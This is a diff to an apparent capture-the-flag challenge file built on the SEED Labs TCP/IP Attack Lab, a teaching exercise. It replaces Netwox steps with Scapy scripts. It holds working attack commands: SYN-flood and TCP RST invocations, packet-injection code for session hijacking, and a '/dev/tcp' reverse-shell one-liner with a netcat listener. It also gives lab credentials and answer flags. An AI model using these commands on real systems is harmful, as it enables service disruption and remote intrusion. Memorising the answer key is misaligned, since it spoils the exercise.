@@ -82,10 +82,10 @@
       "order": 3,
       "estimated_duration": 3,
       "minimal_possible_solve_time": null,
-      "answer": "333",
+      "answer": "8",
       "answer_variable_name": null,
-      "content": "Your mentor has set you up with a diagnostic account on the server, `seedlab` / `Att@ckTCP25`, so you can check server-side state after each attack (exactly the way the lab asks you to compare `netstat -na` before and after an attack).\n\nSSH into the server (`10.1.26.9`) with that account and check the size of the queue used for half-opened TCP connections, i.e. the setting the SEED Labs PDF describes in Task 1:\n```\nsudo sysctl -q net.ipv4.tcp_max_syn_backlog\n```\n\nThe flag is the value returned.",
-      "solution": "```\nuser@attacker:~$ ssh seedlab@10.1.26.9\nseedlab@10.1.26.9's password: Att@ckTCP25\n\nseedlab@server:~$ sudo sysctl -q net.ipv4.tcp_max_syn_backlog\nnet.ipv4.tcp_max_syn_backlog = 333\n```",
+      "content": "Your mentor has set you up with a diagnostic account on the server, `seedlab` / `Att@ckTCP25`, so you can check server-side state after each attack (exactly the way the lab asks you to compare `netstat -na` before and after an attack).\n\nSSH into the server (`10.1.26.9`) with that account and check the size of the queue used for half-opened TCP connections, i.e. the setting the SEED Labs PDF describes in Task 1:\n```\nsudo sysctl -q net.ipv4.tcp_max_syn_backlog\n```\n\nThe flag is the value returned. (Note: this sandbox only has Scapy available, not Netwox, and Scapy sends packets much slower - the backlog here is intentionally small so the next level's flood is actually achievable.)",
+      "solution": "```\nuser@attacker:~$ ssh seedlab@10.1.26.9\nseedlab@10.1.26.9's password: Att@ckTCP25\n\nseedlab@server:~$ sudo sysctl -q net.ipv4.tcp_max_syn_backlog\nnet.ipv4.tcp_max_syn_backlog = 8\n```",
       "solution_penalized": true,
       "hints": [
         {
@@ -121,21 +121,21 @@
       "order": 4,
       "estimated_duration": 5,
       "minimal_possible_solve_time": null,
-      "answer": "netwox 76 -i 10.1.26.9 -p 2323",
+      "answer": "timeout",
       "answer_variable_name": null,
-      "content": "Read Task 1 (\"SYN Flooding Attack\") of the attached SEED Labs TCP/IP Attack Lab PDF. The corresponding Netwox tool is numbered **76**.\n\nFrom `attacker`, launch a SYN flood against the server's telnet port you found earlier. While the attack is running, SSH into the server with the `seedlab` diagnostic account (from the previous level) and run `netstat -na` on a separate connection - you should see many connections to the telnet port stuck in `SYN-RECV` state.\n\nIf you cannot get `netwox` working, an equivalent Scapy one-liner (looping `send()` of spoofed SYN packets to `10.1.26.9:2323`) is also accepted by your mentor, but the submitted flag below must still be the exact netwox invocation.\n\nThe flag is the exact `netwox` command (with IP and port filled in) used to flood the server's telnet port.",
-      "solution": "```\nuser@attacker:~$ sudo netwox 76 -i 10.1.26.9 -p 2323\n```\nOn the server, before the attack `netstat -na | grep 2323` shows no half-opened connections; during the attack it shows dozens of entries in `SYN-RECV` state, up to the `net.ipv4.tcp_max_syn_backlog` limit (333) found in the previous level.",
+      "content": "Read Task 1 (\"SYN Flooding Attack\") of the attached SEED Labs TCP/IP Attack Lab PDF. This sandbox only has **Scapy** available (no Netwox) - a skeleton script is already on your `attacker` machine at `/home/user/scripts/synflood_skeleton.py`. Fill in the two `@@@@` values (the server's IP and the telnet port you found during recon) and run it with `sudo python3`.\n\nWhile the flood is running, SSH into the server with the `seedlab` account and watch the half-open connection queue fill up:\n```\nwatch -n1 'ss -tn state syn-recv | wc -l'\n```\n\nOnce it stabilizes at the backlog limit you found in the previous level, open a **brand-new, third** terminal on `attacker` and try a completely normal connection:\n```\ntelnet 10.1.26.9 2323\n```\n\nThe flag is the one word that best describes what this new, legitimate connection attempt does.",
+      "solution": "```\nuser@attacker:~$ sudo python3 /home/user/scripts/synflood_skeleton.py\nSent 2000 spoofed SYN packets to 10.1.26.9:2323\n\n# second terminal, via ssh to the server:\nseedlab@server:~$ watch -n1 'ss -tn state syn-recv | wc -l'\n8\n\n# third terminal, on attacker, a normal connection attempt:\nuser@attacker:~$ telnet 10.1.26.9 2323\nTrying 10.1.26.9...\n(hangs - no SYN-ACK ever comes back, because the backlog queue is full)\n```\nThe new connection attempt times out: the kernel has no free slot left in the half-open connection queue to answer it.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Where do I find the tool number?",
-          "content": "Section 3.1 of the attached PDF (\"Task 1: SYN Flooding Attack\") names the Netwox tool number for this attack.",
+          "title": "The script needs your own recon values",
+          "content": "Open `/home/user/scripts/synflood_skeleton.py` and replace `DST_IP` and `DST_PORT` with the server's IP and the telnet port you found with nmap - they are not filled in for you.",
           "hint_penalty": 1,
           "order": 0
         },
         {
-          "title": "What is the exact syntax?",
-          "content": "`netwox 76 -i <destination-ip> -p <destination-port>`. Use the server's IP and the telnet port you discovered in the recon level.",
+          "title": "What should the new connection attempt do?",
+          "content": "With the backlog full and SYN cookies still off, the kernel silently drops new SYNs instead of answering - from the client's point of view the connection just hangs until it gives up.",
           "hint_penalty": 1.5,
           "order": 1
         }
@@ -150,9 +150,9 @@
           "prereq_state": [
             "lan_scanned"
           ],
-          "cmd": "netwox 76 -i 10.1.26.9 -p 2323",
+          "cmd": "python3 /home/user/scripts/synflood_skeleton.py",
           "cmd_type": "bash-command",
-          "cmd_regex": "netwox 76 -i 10\\.1\\.26\\.9 -p 2323",
+          "cmd_regex": "python3 .*synflood.*\\.py",
           "optional": false
         },
         {
@@ -161,9 +161,9 @@
             "syn_flood_launched",
             "ssh_diag_access"
           ],
-          "cmd": "netstat -na",
+          "cmd": "ss -tn state syn-recv",
           "cmd_type": "bash-command",
-          "cmd_regex": "netstat -na",
+          "cmd_regex": "ss -tn state syn-recv",
           "optional": true
         }
       ],
@@ -180,7 +180,7 @@
       "answer": "sysctl -w net.ipv4.tcp_syncookies=1",
       "answer_variable_name": null,
       "content": "SYN cookies are currently **disabled** on the server, which is why your flood worked so well. On the server (via the `seedlab` SSH account), turn SYN cookies on, then repeat the SYN flood from `attacker` and compare `netstat -na` again - the half-opened connection queue should no longer fill up the same way.\n\nThe flag is the exact command (with option and value) used to enable SYN cookies.",
-      "solution": "```\nseedlab@server:~$ sudo sysctl -w net.ipv4.tcp_syncookies=1\nnet.ipv4.tcp_syncookies = 1\n```\nRe-running `netwox 76 -i 10.1.26.9 -p 2323` now produces far fewer (or no) persistent `SYN-RECV` entries, because the kernel answers with cryptographically-encoded SYN-ACKs instead of allocating backlog entries.",
+      "solution": "```\nseedlab@server:~$ sudo sysctl -w net.ipv4.tcp_syncookies=1\nnet.ipv4.tcp_syncookies = 1\n```\nRe-running `synflood_skeleton.py` now produces far fewer (or no) persistent `SYN-RECV` entries, because the kernel answers with cryptographically-encoded SYN-ACKs instead of allocating backlog entries.",
       "solution_penalized": true,
       "hints": [
         {
@@ -216,21 +216,21 @@
       "order": 6,
       "estimated_duration": 4,
       "minimal_possible_solve_time": null,
-      "answer": "netwox 78 -d eth0 -f \"tcp and port 2323\"",
+      "answer": "10.1.26.9:2323",
       "answer_variable_name": null,
-      "content": "The `client` machine keeps a live telnet session open to the server's telnet service the whole time (it reconnects automatically, so you cannot \"use up\" it). Read Task 2 of the attached PDF (\"TCP RST Attacks on telnet and ssh Connections\"). The corresponding Netwox tool is numbered **78**.\n\nFrom `attacker`, sniff the LAN and use a TCP RST attack to break the live telnet session (port 2323) between `client` and `server`. You should observe (e.g. via `tcpdump -i eth0 port 2323`) the connection reset, immediately followed by the client's automatic reconnect.\n\nThe flag is the exact `netwox` command, including the capture filter, used for this attack.",
-      "solution": "```\nuser@attacker:~$ sudo netwox 78 -d eth0 -f \"tcp and port 2323\"\n```\nWatching `tcpdump -i eth0 port 2323` while this runs shows RST packets being injected and the existing telnet TCP stream terminating, after which the client machine immediately opens a brand-new connection.",
+      "content": "The `client` machine keeps a live telnet session open to the server's telnet service the whole time (it reconnects automatically, so you cannot \"use up\" it). Read Task 2 of the attached PDF (\"TCP RST Attacks on telnet and ssh Connections\"). This sandbox only has **Scapy** available - a skeleton script is on your `attacker` machine at `/home/user/scripts/rst_attack_skeleton.py`.\n\nFill in `TARGET_PORT` with the telnet port you found during recon, then run it. It sniffs one live packet of the session to learn the correct sequence/ack numbers and ports, then sends a spoofed RST. You should observe (e.g. via `tcpdump -i eth0 port 2323`) the connection reset, immediately followed by the client's automatic reconnect.\n\nThe flag is the exact destination you targeted, in `ip:port` format.",
+      "solution": "```\nuser@attacker:~$ sudo python3 /home/user/scripts/rst_attack_skeleton.py\nSniffing one packet on port 2323 to learn seq/ack/ports...\nRST sent. The connection should now be torn down.\n```\nWatching `tcpdump -i eth0 port 2323` while this runs shows the existing telnet TCP stream terminating right after the spoofed RST, after which the client machine immediately opens a brand-new connection. The destination you targeted is `10.1.26.9:2323`.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Which tool and option resets connections?",
-          "content": "Netwox tool `78` resets every TCP packet matching a pcap filter, passed with `-f`.",
+          "title": "Which value do I fill in?",
+          "content": "`TARGET_PORT` must be the telnet port you discovered with nmap in the recon level, not 23.",
           "hint_penalty": 1,
           "order": 0
         },
         {
-          "title": "What filter do I need?",
-          "content": "A pcap filter restricting to the telnet port: `tcp and port 2323`.",
+          "title": "Why does sniffing one packet matter?",
+          "content": "A RST packet is only accepted by the receiving TCP stack if its sequence number falls in the right window - you need a real, recent seq/ack pair from the live session, which is why the script sniffs one packet first.",
           "hint_penalty": 1,
           "order": 1
         }
@@ -245,9 +245,9 @@
           "prereq_state": [
             "syncookies_enabled"
           ],
-          "cmd": "netwox 78 -d eth0 -f \"tcp and port 2323\"",
+          "cmd": "python3 /home/user/scripts/rst_attack_skeleton.py",
           "cmd_type": "bash-command",
-          "cmd_regex": "netwox 78 -d eth0 -f .tcp and port 2323.",
+          "cmd_regex": "python3 .*rst_attack.*\\.py",
           "optional": false
         }
       ],
@@ -261,15 +261,15 @@
       "order": 7,
       "estimated_duration": 3,
       "minimal_possible_solve_time": null,
-      "answer": "netwox 78 -d eth0 -f \"tcp and port 22\"",
+      "answer": "10.1.26.9:22",
       "answer_variable_name": null,
-      "content": "The `client` machine also keeps a persistent SSH session open to the server. Repeat the TCP RST attack, this time against that SSH connection (port 22), and observe that it breaks exactly the same way as the unencrypted telnet session did - TCP RST attacks exploit TCP itself, not the application layer, so encryption gives no protection against them.\n\nThe flag is the exact `netwox` command, including the capture filter, used for this attack.",
-      "solution": "```\nuser@attacker:~$ sudo netwox 78 -d eth0 -f \"tcp and port 22\"\n```\nThe SSH session drops with a `Connection reset by peer` / `kex_exchange_identification` style error on the client side, even though the attacker never saw any of the encrypted SSH payload.",
+      "content": "The `client` machine also keeps a persistent SSH session open to the server. Repeat the TCP RST attack (same `/home/user/scripts/rst_attack_skeleton.py` script), this time against that SSH connection (port 22), and observe that it breaks exactly the same way as the unencrypted telnet session did - TCP RST attacks exploit TCP itself, not the application layer, so encryption gives no protection against them.\n\nThe flag is the exact destination you targeted, in `ip:port` format.",
+      "solution": "```\nuser@attacker:~$ sudo python3 /home/user/scripts/rst_attack_skeleton.py\n```\n(with `TARGET_PORT = 22`) The SSH session drops with a `Connection reset by peer` / `kex_exchange_identification` style error on the client side, even though the attacker never saw any of the encrypted SSH payload. The destination you targeted is `10.1.26.9:22`.",
       "solution_penalized": true,
       "hints": [
         {
           "title": "Same attack, different port",
-          "content": "Reuse the exact same technique as the telnet RST level, just change the filter's port number to 22.",
+          "content": "Reuse the exact same script as the telnet RST level, just change `TARGET_PORT` to 22.",
           "hint_penalty": 1,
           "order": 0
         }
@@ -284,9 +284,9 @@
           "prereq_state": [
             "rst_telnet_done"
           ],
-          "cmd": "netwox 78 -d eth0 -f \"tcp and port 22\"",
+          "cmd": "python3 /home/user/scripts/rst_attack_skeleton.py",
           "cmd_type": "bash-command",
-          "cmd_regex": "netwox 78 -d eth0 -f .tcp and port 22.",
+          "cmd_regex": "python3 .*rst_attack.*\\.py",
           "optional": false
         }
       ],
@@ -300,10 +300,10 @@
       "order": 8,
       "estimated_duration": 3,
       "minimal_possible_solve_time": null,
-      "answer": "netwox 78 -d eth0 -f \"tcp and port 9091\"",
+      "answer": "10.1.26.9:9091",
       "answer_variable_name": null,
-      "content": "Finally, read Task 3 of the attached PDF (\"TCP RST Attacks on Video Streaming Applications\"). In this sandbox, the server runs a small always-on streaming service instead of a real video site (you already saw it in your nmap scan from the first level), and `client` keeps a permanent connection open to it, just like a user watching a stream.\n\nDisrupt that streaming connection the same way as before.\n\nThe flag is the exact `netwox` command, including the capture filter, used for this attack.",
-      "solution": "```\nuser@attacker:~$ sudo netwox 78 -d eth0 -f \"tcp and port 9091\"\n```\nThe streaming client's output stops abruptly mid-line and then a brand-new connection starts, exactly like a viewer whose video playback gets interrupted and reloads.",
+      "content": "Finally, read Task 3 of the attached PDF (\"TCP RST Attacks on Video Streaming Applications\"). In this sandbox, the server runs a small always-on streaming service instead of a real video site (you already saw it in your nmap scan from the first level), and `client` keeps a permanent connection open to it, just like a user watching a stream.\n\nDisrupt that streaming connection the same way as before.\n\nThe flag is the exact destination you targeted, in `ip:port` format.",
+      "solution": "```\nuser@attacker:~$ sudo python3 /home/user/scripts/rst_attack_skeleton.py\n```\n(with `TARGET_PORT = 9091`) The streaming client's output stops abruptly mid-line and then a brand-new connection starts, exactly like a viewer whose video playback gets interrupted and reloads. The destination you targeted is `10.1.26.9:9091`.",
       "solution_penalized": true,
       "hints": [
         {
@@ -323,9 +323,9 @@
           "prereq_state": [
             "rst_ssh_done"
           ],
-          "cmd": "netwox 78 -d eth0 -f \"tcp and port 9091\"",
+          "cmd": "python3 /home/user/scripts/rst_attack_skeleton.py",
           "cmd_type": "bash-command",
-          "cmd_regex": "netwox 78 -d eth0 -f .tcp and port 9091.",
+          "cmd_regex": "python3 .*rst_attack.*\\.py",
           "optional": false
         }
       ],
@@ -341,19 +341,19 @@
       "minimal_possible_solve_time": null,
       "answer": "TCPHIJACK-9f41",
       "answer_variable_name": null,
-      "content": "Breaking a connection is noisy and easy to notice. Read Task 4 of the attached PDF (\"TCP Session Hijacking\"): instead of resetting the telnet session, you will inject a command into it while leaving it alive, exactly as a real attacker would to plant a backdoor unnoticed.\n\nSteps:\n1. Sniff the live telnet session (port 2323) between `client` and `server` with `tcpdump`/`tshark` to read the current source port, sequence number and ack number of an in-flight packet.\n2. Using Netwox tool **40** (or the Scapy skeleton from the PDF, adapted to this sandbox's addresses), craft and send a spoofed packet that looks like it comes from `client`, carrying the following command as TCP payload:\n```\necho TCPHIJACK-9f41 > /tmp/hijack_proof.txt\n```\n3. Confirm the injection worked by SSHing into the server with the `seedlab` diagnostic account and reading `/tmp/hijack_proof.txt`.\n\nThe flag is the exact string that gets written into `/tmp/hijack_proof.txt`.",
-      "solution": "```\nuser@attacker:~$ sudo tcpdump -i eth0 -nn tcp port 2323\n... (read seq, ack, client source port from a captured packet)\n\nuser@attacker:~$ python3\n>>> from scapy.all import *\n>>> ip  = IP(src=\"10.1.26.4\", dst=\"10.1.26.9\")\n>>> tcp = TCP(sport=<client_src_port>, dport=2323, flags=\"PA\", seq=<seq>, ack=<ack>)\n>>> data = \"echo TCPHIJACK-9f41 > /tmp/hijack_proof.txt\\r\"\n>>> send(ip/tcp/data, verbose=0)\n\nuser@attacker:~$ ssh seedlab@10.1.26.9\nseedlab@server:~$ cat /tmp/hijack_proof.txt\nTCPHIJACK-9f41\n```",
+      "content": "Breaking a connection is noisy and easy to notice. Read Task 4 of the attached PDF (\"TCP Session Hijacking\"): instead of resetting the telnet session, you will inject a command into it while leaving it alive, exactly as a real attacker would to plant a backdoor unnoticed.\n\nA skeleton script is on your `attacker` machine at `/home/user/scripts/hijack_skeleton.py`. Steps:\n1. Fill in `TELNET_PORT` with the port you found during recon.\n2. Fill in the injected command (the `@@@@` next to `data =`) with:\n```\necho TCPHIJACK-9f41 > /tmp/hijack_proof.txt\n```\n3. Run the script. It sniffs one in-flight packet to read the session's current sequence/ack numbers and source port, then injects your command without resetting the connection.\n4. Confirm the injection worked by SSHing into the server with the `seedlab` diagnostic account and reading `/tmp/hijack_proof.txt`.\n\nThe flag is the exact string that gets written into `/tmp/hijack_proof.txt`.",
+      "solution": "```\nuser@attacker:~$ sudo python3 /home/user/scripts/hijack_skeleton.py\nSniffing one in-flight packet on port 2323...\nInjected. Confirm over SSH whether the command actually ran on the server.\n\nuser@attacker:~$ ssh seedlab@10.1.26.9\nseedlab@server:~$ cat /tmp/hijack_proof.txt\nTCPHIJACK-9f41\n```",
       "solution_penalized": true,
       "hints": [
         {
           "title": "Where do seq/ack/port come from?",
-          "content": "Capture a live packet of the ongoing telnet session with `tcpdump -i eth0 -nn tcp port 2323` (or Wireshark) and read its sequence number, ack number and the client's source port - you need all three to build a packet the server will accept as the next one in that stream.",
+          "content": "The script sniffs one live packet of the ongoing telnet session automatically and reuses its sequence number, ack number and source port - you just have to point it at the right port.",
           "hint_penalty": 1,
           "order": 0
         },
         {
           "title": "What exact command do I need to inject?",
-          "content": "`echo TCPHIJACK-9f41 > /tmp/hijack_proof.txt` - this is the exact text that must reach the server as TCP payload.",
+          "content": "`echo TCPHIJACK-9f41 > /tmp/hijack_proof.txt` - this is the exact text that must reach the server as TCP payload (replace the `@@@@` after `data =` with it, keeping the quotes).",
           "hint_penalty": 1.5,
           "order": 1
         }
@@ -386,13 +386,13 @@
       "minimal_possible_solve_time": null,
       "answer": "SEED-TCPLAB-FINAL-7e2b9c",
       "answer_variable_name": null,
-      "content": "One injected command is fun, but a real attacker wants persistent, convenient access. Read Task 5 of the attached PDF (\"Creating Reverse Shell using TCP Session Hijacking\").\n\n1. On `attacker`, start a listener: `nc -lvp 4444`.\n2. Using TCP session hijacking (same technique as the previous level, against a *new* in-flight packet - your old sequence numbers are now stale), inject a reverse shell one-liner into the live telnet session so the server connects back to your listener, e.g.:\n```\n/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1\n```\n3. Once your listener catches the shell, you will be running as the `victim` account on the server (the same account the hijacked telnet session belongs to). Read its final flag file.\n\nThe flag is the content of `~/flag_final.txt` as read through your reverse shell.",
-      "solution": "```\nuser@attacker:~$ nc -lvp 4444\n\n# in a second terminal: capture a fresh packet, then inject:\nuser@attacker:~$ python3\n>>> from scapy.all import *\n>>> ip  = IP(src=\"10.1.26.4\", dst=\"10.1.26.9\")\n>>> tcp = TCP(sport=<client_src_port>, dport=2323, flags=\"PA\", seq=<new_seq>, ack=<new_ack>)\n>>> data = \"/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1\\r\"\n>>> send(ip/tcp/data, verbose=0)\n\n# back in the nc terminal:\nConnection from 10.1.26.9 received!\nvictim@server:~$ cat flag_final.txt\nSEED-TCPLAB-FINAL-7e2b9c\n```",
+      "content": "One injected command is fun, but a real attacker wants persistent, convenient access. Read Task 5 of the attached PDF (\"Creating Reverse Shell using TCP Session Hijacking\").\n\n1. On `attacker`, start a listener: `nc -lvp 4444`.\n2. Edit `/home/user/scripts/hijack_skeleton.py` again (a *new* in-flight packet - your old sequence numbers are now stale) and replace the injected command with a reverse shell one-liner, e.g.:\n```\n/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1\n```\n3. Run the script. Once your listener catches the shell, you will be running as the `victim` account on the server (the same account the hijacked telnet session belongs to). Read its final flag file.\n\nThe flag is the content of `~/flag_final.txt` as read through your reverse shell.",
+      "solution": "```\nuser@attacker:~$ nc -lvp 4444\n\n# in a second terminal, after editing the injected command in hijack_skeleton.py:\nuser@attacker:~$ sudo python3 /home/user/scripts/hijack_skeleton.py\n\n# back in the nc terminal:\nConnection from 10.1.26.9 received!\nvictim@server:~$ cat flag_final.txt\nSEED-TCPLAB-FINAL-7e2b9c\n```",
       "solution_penalized": true,
       "hints": [
         {
           "title": "Start the listener first",
-          "content": "Start `nc -lvp <port>` on `attacker` BEFORE you inject the reverse-shell command, otherwise the connection back has nothing to connect to. Use `10.1.26.23` (your own attacker IP) as the callback address.",
+          "content": "Start `nc -lvp <port>` on `attacker` BEFORE you run the script, otherwise the connection back has nothing to connect to. Use `10.1.26.23` (your own attacker IP) as the callback address.",
           "hint_penalty": 1,
           "order": 0
         },
